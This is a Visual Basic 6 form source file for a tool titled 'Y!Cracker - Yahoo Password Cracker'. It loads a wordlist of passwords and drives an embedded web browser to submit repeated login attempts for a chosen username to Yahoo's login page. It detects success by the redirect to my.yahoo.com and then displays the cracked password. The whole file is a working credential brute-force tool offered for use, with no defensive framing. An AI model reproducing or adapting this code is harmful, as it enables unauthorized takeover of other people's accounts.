VERSION 5.00
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "shdocvw.dll"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form frmmain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Y!Cracker - Yahoo Password Cracker"
   ClientHeight    =   4710
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   3735
   Icon            =   "frmmain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4710
   ScaleWidth      =   3735
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox txtAddress 
      Height          =   285
      Left            =   4080
      TabIndex        =   11
      Top             =   0
      Width           =   6735
   End
   Begin VB.TextBox txtTimer 
      Height          =   285
      Left            =   960
      TabIndex        =   10
      Text            =   "10"
      Top             =   3960
      Width           =   495
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Crack!"
      Height          =   375
      Left            =   120
      TabIndex        =   8
      Top             =   4320
      Width           =   3495
   End
   Begin VB.TextBox txtUserName 
      Height          =   285
      Left            =   960
      TabIndex        =   7
      Top             =   3600
      Width           =   2535
   End
   Begin VB.Frame Frame1 
      Caption         =   "Password List"
      Height          =   3015
      Left            =   120
      TabIndex        =   4
      Top             =   480
      Width           =   3495
      Begin VB.ListBox lstPass 
         Height          =   2595
         ItemData        =   "frmmain.frx":0442
         Left            =   120
         List            =   "frmmain.frx":0444
         TabIndex        =   5
         Top             =   240
         Width           =   3255
      End
   End
   Begin MSComDlg.CommonDialog Dia1 
      Left            =   120
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      DialogTitle     =   "Select Password List..."
      Filter          =   "Text Files|*.txt|Text Documents|*.doc|All File Types|*.*"
   End
   Begin SHDocVwCtl.WebBrowser Web1 
      Height          =   7335
      Left            =   4080
      TabIndex        =   3
      Top             =   480
      Width           =   6735
      ExtentX         =   11880
      ExtentY         =   12938
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
   Begin VB.CommandButton Command1 
      Caption         =   "..."
      Height          =   255
      Left            =   3360
      TabIndex        =   2
      Top             =   120
      Width           =   255
   End
   Begin VB.TextBox txtPassList 
      Height          =   285
      Left            =   1200
      TabIndex        =   1
      Top             =   120
      Width           =   2055
   End
   Begin VB.Label Label3 
      Caption         =   "Wait Timer:"
      Height          =   255
      Left            =   120
      TabIndex        =   9
      Top             =   3960
      Width           =   855
   End
   Begin VB.Label Label2 
      Caption         =   "Username:"
      Height          =   255
      Left            =   120
      TabIndex        =   6
      Top             =   3600
      Width           =   855
   End
   Begin VB.Label Label1 
      Caption         =   "Password List:"
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   1095
   End
End
Attribute VB_Name = "frmmain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Dim lstInput As String

Dia1.ShowOpen

If Dia1.FileName = "" Then
Exit Sub
Else
    
    lstPass.Clear
    On Error Resume Next
    Open Dia1.FileName For Input As #1
    While Not EOF(1)
        Input #1, lstInput$
        'DoEvents
        lstPass.AddItem ReplaceText(lstInput$, "@aol.com", "")
    Wend
    Close #1
txtPassList.Text = Dia1.FileName
lstPass.ListIndex = 0
End If
End Sub

Private Sub Command2_Click()
Web1.Navigate "http://login.yahoo.com/config?login=" & txtUserName.Text & "&passwd=" & lstPass.Text
Pause (txtTimer.Text)
If txtAddress.Text = "http://my.yahoo.com/" Then
MsgBox "The password for " & txtUserName.Text & " is " & lstPass.Text & "!", vbCritical, "Password Successfully Cracked!"
Exit Sub
Else
Call NextList
End If
End Sub

Sub NextList()
If lstPass.ListIndex = lstPass.ListCount - 1 Then
MsgBox "Could not find password in list!", vbCritical, "Could not find password!"
Exit Sub
Else
lstPass.ListIndex = lstPass.ListIndex + 1
Call Command2_Click
End If
End Sub

Sub Pause(interval)
Dim Current
Current = Timer
Do While Timer - Current < Val(interval)
DoEvents
Loop
End Sub

Public Function ReplaceText(tMain As String, tFind As String, tReplace As String) As String
    'replaces a string within a larger string
    Dim iFind As Long, lString As String, rString As String, rText As String, tMain2 As String
    
    iFind& = InStr(1, LCase(tMain$), LCase(tFind$))
    If iFind& = 0& Then ReplaceText = tMain$: Exit Function
    
    Do
        DoEvents
        
        lString$ = Left(tMain$, iFind& - 1)
        rString$ = Mid(tMain$, iFind& + Len(tFind$), Len(tMain$) - (Len(lString$) + Len(tFind$)))
        tMain$ = lString$ + "" + tReplace$ + "" + rString$
        
        iFind& = InStr(iFind& + Len(tReplace$), LCase(tMain$), LCase(tFind$))
        If iFind& = 0& Then Exit Do
    Loop
    
    ReplaceText = tMain$
End Function

Private Sub Form_Unload(Cancel As Integer)
End
End Sub

Private Sub Web1_BeforeNavigate2(ByVal pDisp As Object, URL As Variant, Flags As Variant, TargetFrameName As Variant, PostData As Variant, Headers As Variant, Cancel As Boolean)
txtAddress.Text = Web1.LocationURL
End Sub

Private Sub Web1_NavigateComplete2(ByVal pDisp As Object, URL As Variant)
txtAddress.Text = Web1.LocationURL
txtAddress.SelStart = 20
txtAddress.SelLength = 100
txtAddress.SelText = ""
End Sub
